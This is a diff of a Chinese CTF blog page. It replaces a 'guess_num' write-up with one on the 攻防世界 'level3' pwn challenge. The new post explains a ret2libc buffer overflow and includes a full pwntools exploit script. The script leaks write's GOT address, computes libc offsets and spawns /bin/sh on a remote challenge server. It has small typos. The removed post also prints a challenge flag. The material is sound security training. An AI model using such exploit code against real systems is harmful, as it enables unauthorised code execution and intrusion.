@@ -16,30 +16,26 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="查看关键main()函数，发现gets(&amp;v11)存在栈溢出  进入sub_C3E()函数，确定满足条件即可cat flag。  题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。  注：（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，">
+    <meta name="description" content="这道题对于我来讲好难好难啊，涉及到了很多新的知识。首先checksec  :可以直接栈溢出；基地址不变化；对数据有执行权限。 查看main()函数：  查看函数function()：  无system,无&#x2F;bin&#x2F;sh，给了一个共享文件libc_32.so.6,明显为ret2libc。  ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界 guess_num">
-<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/index.html">
+<meta property="og:title" content="攻防世界 level3">
+<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="查看关键main()函数，发现gets(&amp;v11)存在栈溢出  进入sub_C3E()函数，确定满足条件即可cat flag。  题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。  注：（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，">
+<meta property="og:description" content="这道题对于我来讲好难好难啊，涉及到了很多新的知识。首先checksec  :可以直接栈溢出；基地址不变化；对数据有执行权限。 查看main()函数：  查看函数function()：  无system,无&#x2F;bin&#x2F;sh，给了一个共享文件libc_32.so.6,明显为ret2libc。  ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png">
-<meta property="og:image" content="https://s1.ax1x.com/2020/05/08/YnNVrd.png">
-<meta property="og:image" content="https://s1.ax1x.com/2020/05/08/YnNMPf.png">
-<meta property="article:published_time" content="2022-08-09T03:17:04.190Z">
-<meta property="article:modified_time" content="2020-09-10T07:29:14.001Z">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png">
+<meta property="article:published_time" content="2022-08-09T03:17:04.177Z">
+<meta property="article:modified_time" content="2020-09-10T07:29:13.974Z">
 <meta property="article:author" content="Sinky">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png">
   
   
   
-  <title>攻防世界 guess_num - Sinky&#39;s Blog</title>
+  <title>攻防世界 level3 - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="攻防世界 guess_num"></span>
+            <span id="subtitle" data-typed-text="攻防世界 level3"></span>
           
         </div>
 
@@ -230,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          655 words
+          2.4k words
         
       </span>
     
@@ -241,7 +237,7 @@
         
         
         
-          6 mins
+          21 mins
         
       </span>
     
@@ -279,30 +275,39 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">攻防世界 guess_num</h1>
+            <h1 style="display: none">攻防世界 level3</h1>
             
             
               <div class="markdown-body">
                 
-                <p>查看关键main()函数，发现gets(&amp;v11)存在栈溢出</p>
-<p><img src="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-c6ff7c8db83a9ec7.png"></p>
-<p>进入sub_C3E()函数，确定满足条件即可cat flag。</p>
-<p><img src="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-1e961fbba4dff1bc.png"></p>
-<p>题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。</p>
+                <p>这道题对于我来讲好难好难啊，涉及到了很多新的知识。<br>首先checksec</p>
+<p><img src="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-3b321a2edea9a331.png"></p>
+<p>:可以直接栈溢出；基地址不变化；对数据有执行权限。</p>
+<p>查看main()函数：</p>
+<p><img src="https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-fde84f52ba2311ab.png"></p>
+<p>查看函数function()：</p>
+<p><img src="https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p>无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。</p>
 <blockquote>
-<p>注：<br>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.<br>（2）libc共享库：可以使用命令 ldd guess_num 查找<br>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)<br>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。</p>
+<p>ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。</p>
 </blockquote>
+<blockquote>
+<p>ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。</p>
+</blockquote>
+<blockquote>
+<p>ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。</p>
+</blockquote>
+<p>read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。</p>
+<p>某大佬攻击思路：</p>
+<p>（1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功</p>
+<blockquote>
+<p>plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；<br>实现手法：增加一层间接跳转。<br>调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。<br>ELF将GOT拆分成两个表叫做.got和.got.plt。<br>.got用来保存全局变量引用的地址<br>.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。</p>
+</blockquote>
+<p><strong>思路</strong> </p>
+<p>通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。</p>
 <p>exp:</p>
-<p><img src="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-82da413e439821bd.png"></p>
-<blockquote>
-<p>解释：<br>引入pwn、ctypes模块；<br>remote连接其他主机服务；<br>elf=ELF(bin路径)本地运行pwn文件；<br>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；<br>recvuntil()接收字符串；<br>sendline(payload)发送payload；<br>srand(1)设定随机数种子为1；<br>循环十次；<br>interactive()直接进行交互；</p>
-</blockquote>
-<p><img src="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-caa9a4e5b8ce9f1a.png"></p>
-<p>另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.</p>
-<p><img src="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="17627983-93fb0ad7c552854b.png"></p>
-<p><img src="https://s1.ax1x.com/2020/05/08/YnNVrd.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="YnNVrd.png"></p>
-<p><img src="https://s1.ax1x.com/2020/05/08/YnNMPf.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="YnNMPf.png"></p>
-<p>cyberpeace{c89cf2a54c56f16458a1164851a361b4}</p>
+<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">52277</span>)<br> # p=process("./level3")<br> # 获取文件对象<br>elf=ELF(<span class="hljs-string">'./level3'</span>)<br> #获取lib库对象<br>libc=ELF(<span class="hljs-string">'./libc_32.so.6'</span>)<br> #获取函数<br>wirte_plt=elf.plt[<span class="hljs-string">'write'</span>]<br>write_got=elf.got[writ<span class="hljs-string">e']</span><br><span class="hljs-string">main_addr=elf.sym['</span>main<span class="hljs-string">']</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string">  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）</span><br><span class="hljs-string">payload=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string"> #获取wirte在got中的地址</span><br><span class="hljs-string">write_got_addr=u32(p.recv())</span><br><span class="hljs-string">print hex(write_got_addr)</span><br><span class="hljs-string"> # 计算lib库加载基址</span><br><span class="hljs-string">libc_base=write_got_addr-libc.sym['</span>writ<span class="hljs-string">e']</span><br><span class="hljs-string">print hex(libc_base)</span><br><span class="hljs-string"> # 计算system的地址</span><br><span class="hljs-string">system_addr=libc_base+libc.sym['</span><span class="hljs-keyword">system</span><span class="hljs-string">']</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #计算字符串/bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep "/bin/sh"获取</span><br><span class="hljs-string">bin_sh_addr=libc_base+0x15902b</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span><br><span class="hljs-string">payload2=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string"> #发送payloas</span><br><span class="hljs-string">p.sendline(payload2)</span><br><span class="hljs-string"> #切换交互模式</span><br><span class="hljs-string">p.interactive()</span><br></code></pre></td></tr></tbody></table></figure>
 
                 
               </div>
@@ -327,8 +332,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>攻防世界 guess_num</div>
-      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/攻防世界pwn-guess_num/</div>
+      <div>攻防世界 level3</div>
+      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/攻防世界-pwn-level3/</div>
     </div>
     <div class="license-meta">
       
@@ -370,9 +375,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" title="攻防世界 int_overflow">
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/" title="攻防世界pwn-100">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">攻防世界 int_overflow</span>
+                        <span class="hidden-mobile">攻防世界pwn-100</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -380,8 +385,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/" title="攻防世界 cgpwn2">
-                        <span class="hidden-mobile">攻防世界 cgpwn2</span>
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" title="攻防世界-dice_game">
+                        <span class="hidden-mobile">攻防世界-dice_game</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
